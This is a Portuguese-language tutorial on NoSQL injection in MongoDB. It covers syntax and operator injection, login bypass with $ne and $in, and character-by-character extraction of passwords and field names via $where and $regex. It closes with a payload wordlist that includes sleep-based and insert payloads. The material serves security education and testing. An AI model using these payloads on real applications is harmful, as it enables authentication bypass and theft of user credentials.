# NoSQL Injection

> teste

## Visão geral

Existem dois tipos diferentes de injeção NoSQL:

- **Injeção de sintaxe** - Ocorre quando é possível quebrar a sintaxe da consulta NoSQL, permitindo a injeção de payloads personalizados. A metodologia é semelhante à utilizada na injeção SQL. No entanto, a natureza do ataque varia significativamente, pois os bancos de dados NoSQL utilizam uma variedade de linguagens de consulta, tipos de sintaxe de consulta e diferentes estruturas de dados.
- **Injeção de operador** - Ocorre quando é possível usar operadores de consulta NoSQL para manipular as consultas.

## Injeção de sintaxe NoSQL

É possível detectar vulnerabilidades de injeção NoSQL tentando quebrar a sintaxe da consulta. Para isso, teste sistematicamente cada entrada enviando strings de teste e caracteres especiais que acionem um erro de banco de dados ou algum outro comportamento detectável caso não sejam adequadamente sanitizados ou filtrados pelo aplicativo.

Se você conhece a linguagem da API do banco de dados alvo, utilize caracteres especiais e strings de teste relevantes para essa linguagem. Caso contrário, utilize uma variedade de strings de teste para atingir várias linguagens de API.

### Detectando injeção de sintaxe no MongoDB

Considere um aplicativo de compras que exibe produtos em diferentes categorias. Quando o usuário seleciona a categoria "Refrigerantes", o navegador solicita a seguinte URL:

```text
https://insecure-website.com/product/lookup?category=fizzy
```

Isso faz com que o aplicativo envie uma consulta JSON para recuperar os produtos relevantes da coleção de produtos no banco de dados MongoDB:

```javascript
this.category == 'fizzy'
```

#### Determinando quais caracteres são processados

Para determinar quais caracteres são interpretados como sintaxe pelo aplicativo, você pode injetar caracteres individuais. Por exemplo, você pode enviar `'`, o que resulta na seguinte consulta MongoDB:

```javascript
this.category == '''
```

Se isso causar uma alteração na resposta original, pode indicar que o caractere `'` quebrou a sintaxe da consulta e causou um erro de sintaxe. Você pode confirmar isso enviando uma string de consulta válida na entrada, por exemplo, escapando as aspas:

```javascript
this.category == '\''
```

Se isso não causar um erro de sintaxe, pode significar que o aplicativo é vulnerável a um ataque de injeção.

#### Confirmando o comportamento condicional

Após detectar uma vulnerabilidade, o próximo passo é determinar se é possível influenciar condições booleanas usando a sintaxe NoSQL.

Para testar isso, envie duas requisições, uma com uma condição falsa e outra com uma condição verdadeira.

Por exemplo, você pode usar as instruções condicionais `' && 0 && 'x` e `' && 1 && 'x` da seguinte forma:

```text
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

Se o aplicativo se comportar de maneira diferente, isso sugere que a condição falsa impacta a lógica da consulta, mas a condição verdadeira não. Isso indica que injetar esse tipo de sintaxe impacta uma consulta no servidor.

#### Sobrescrevendo condições existentes

Agora que você identificou que pode influenciar condições booleanas, pode tentar sobrescrever condições existentes para explorar a vulnerabilidade. Por exemplo, você pode injetar uma condição em JavaScript que sempre resulta em verdadeiro, como `'||'1'=='1`:

```text
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

Isso resulta na seguinte consulta ao MongoDB:

```javascript
this.category == 'fizzy'||'1'=='1'
```

Como a condição injetada é sempre verdadeira, a consulta modificada retorna todos os itens. Isso permite visualizar todos os produtos em qualquer categoria, incluindo categorias ocultas ou desconhecidas.

> **Aviso**
>
> Tenha cuidado ao injetar uma condição que sempre resulta em verdadeiro em uma consulta NoSQL. Embora isso possa ser inofensivo no contexto inicial em que você está inserindo os dados, é comum que aplicativos usem dados de uma única solicitação em várias consultas diferentes. Se um aplicativo os usar ao atualizar ou excluir dados, por exemplo, isso pode resultar em perda acidental de dados.

Você também pode adicionar um caractere nulo após o valor da categoria. O MongoDB pode ignorar todos os caracteres após um caractere nulo. Isso significa que quaisquer condições adicionais na consulta do MongoDB serão ignoradas. Por exemplo, a consulta pode ter uma restrição adicional `this.released`:

```javascript
this.category == 'fizzy' && this.released == 1
```

A restrição `this.released == 1` é usada para exibir apenas os produtos que foram lançados. Para produtos não lançados, presume-se que `this.released == 0`.

Nesse caso, um atacante poderia construir um ataque da seguinte forma:

```text
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Isso resulta na seguinte consulta NoSQL:

```javascript
this.category == 'fizzy'\u0000' && this.released == 1
```

Se o MongoDB ignorar todos os caracteres após o caractere nulo, isso elimina a necessidade de o campo `released` ser definido como 1. Como resultado, todos os produtos da categoria `fizzy` são exibidos, incluindo os produtos não lançados.

## Injeção de operadores NoSQL

Bancos de dados NoSQL frequentemente utilizam operadores de consulta, que fornecem maneiras de especificar as condições que os dados devem atender para serem incluídos no resultado da consulta. Exemplos de operadores de consulta do MongoDB incluem:

- `$where` - Encontra documentos que satisfazem uma expressão JavaScript.
- `$ne` - Encontra todos os valores que não são iguais a um valor especificado.
- `$in` - Encontra todos os valores especificados em uma matriz.
- `$regex` - Seleciona documentos cujos valores correspondem a uma expressão regular especificada.

Você pode injetar operadores de consulta para manipular consultas NoSQL. Para fazer isso, envie sistematicamente diferentes operadores em uma variedade de entradas do usuário e, em seguida, revise as respostas em busca de mensagens de erro ou outras alterações.

### Enviando operadores de consulta

Em mensagens JSON, você pode inserir operadores de consulta como objetos aninhados. Por exemplo, `{"username":"wiener"}` torna-se `{"username":{"$ne":"invalid"}}`.

Para entradas baseadas em URL, você pode inserir operadores de consulta por meio de parâmetros de URL. Por exemplo, `username=wiener` torna-se `username[$ne]=invalid`. Se isso não funcionar, você pode tentar o seguinte:

1. Converter o método da requisição de GET para POST.
2. Alterar o cabeçalho `Content-Type` para `application/json`.
3. Adicionar JSON ao corpo da mensagem.
4. Injetar operadores de consulta no JSON.

> **Observação**
>
> Você pode usar a extensão Content Type Converter para converter automaticamente o método da requisição e alterar uma requisição POST codificada em URL para JSON.

### Detectando injeção de operadores no MongoDB

Considere um aplicativo vulnerável que aceita um nome de usuário e senha no corpo de uma requisição POST:

```json
{"username":"wiener","password":"peter"}
```

Teste cada entrada com uma variedade de operadores. Por exemplo, para testar se o campo de entrada de nome de usuário processa o operador de consulta, você pode tentar a seguinte injeção:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Se o operador `$ne` for aplicado, a consulta retornará todos os usuários cujo nome de usuário não seja igual a "invalid".

Se os campos de entrada de nome de usuário e senha processarem o operador, pode ser possível burlar a autenticação usando o seguinte payload:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Essa consulta retornará todas as credenciais de login em que tanto o nome de usuário quanto a senha não sejam iguais a "invalid". Como resultado, você estará logado no aplicativo como o primeiro usuário da coleção.

Para direcionar uma conta específica, você pode construir um payload que inclua um nome de usuário conhecido ou um nome de usuário que você tenha adivinhado. Por exemplo:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## Explorando injeção de sintaxe para extrair dados

Em muitos bancos de dados NoSQL, alguns operadores ou funções de consulta podem executar código JavaScript limitado, como o operador `$where` do MongoDB e a função `mapReduce()`. Isso significa que, se um aplicativo vulnerável usar esses operadores ou funções, o banco de dados poderá avaliar o JavaScript como parte da consulta. Portanto, você poderá usar funções JavaScript para extrair dados do banco de dados.

### Exfiltrando dados no MongoDB

Considere um aplicativo vulnerável que permite aos usuários consultar outros nomes de usuário registrados e exibir suas funções. Isso aciona uma requisição para a URL:

```text
https://insecure-website.com/user/lookup?username=admin
```

Isso resulta na seguinte consulta NoSQL na coleção de usuários:

```json
{"$where":"this.username == 'admin'"}
```

Como a consulta usa o operador `$where`, você pode tentar injetar funções JavaScript nela para que retorne dados sensíveis. Por exemplo, você pode enviar o seguinte payload:

```javascript
'admin' && this.password[0] == 'a' || 'a'=='b
```

Isso retorna o primeiro caractere da senha do usuário, permitindo que você extraia a senha caractere por caractere.

Você também pode usar a função `match()` do JavaScript para extrair informações. Por exemplo, o seguinte payload permite identificar se a senha contém dígitos:

```javascript
'admin' && this.password.match(/\d/) || 'a'=='b
```

### Identificando nomes de campos

Como o MongoDB lida com dados semiestruturados que não exigem um esquema fixo, pode ser necessário identificar os campos válidos na coleção antes de extrair dados usando injeção de JavaScript.

Por exemplo, para identificar se o banco de dados MongoDB contém um campo de senha, você pode enviar o seguinte payload:

```text
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Envie o payload novamente para um campo existente e para um campo que não existe. Neste exemplo, você sabe que o campo de nome de usuário existe, então pode enviar os seguintes payloads:

```javascript
admin' && this.username!='
admin' && this.foo!='
```

Se o campo de senha existir, você espera que a resposta seja idêntica à resposta para o campo existente (`username`), mas diferente da resposta para o campo que não existe (`foo`).

Se você quiser testar diferentes nomes de campos, pode realizar um ataque de dicionário, usando uma lista de palavras para percorrer diferentes nomes de campos em potencial.

## Explorando a injeção de operadores NoSQL para extrair dados

Mesmo que a consulta original não use nenhum operador que permita executar JavaScript arbitrário

### Extraindo nomes de campos

Se você injetou um operador que permite executar JavaScript, pode ser possível usar o método `keys()` para extrair o nome dos campos de dados. Por exemplo, você poderia enviar o seguinte payload:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Isso inspeciona o primeiro campo de dados no objeto do usuário e retorna o primeiro caractere do nome do campo. Isso permite extrair o nome do campo caractere por caractere.

### Exfiltrando dados usando operadores

Alternativamente, você pode extrair dados usando operadores que não permitem executar JavaScript. Por exemplo, você pode usar o operador `$regex` para extrair dados caractere por caractere.

Considere um aplicativo vulnerável que aceita um nome de usuário e senha no corpo de uma requisição POST. Por exemplo:

```json
{"username":"myuser","password":"mypass"}
```

Você pode começar testando se o operador `$regex` é processado da seguinte forma:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Se a resposta a esta solicitação for diferente da que você recebe ao enviar uma senha incorreta, isso indica que o aplicativo pode ser vulnerável. Você pode usar o operador `$regex` para extrair dados caractere por caractere. Por exemplo, a seguinte carga útil verifica se a senha começa com a letra "a":

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

## Wordlist

```text
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```
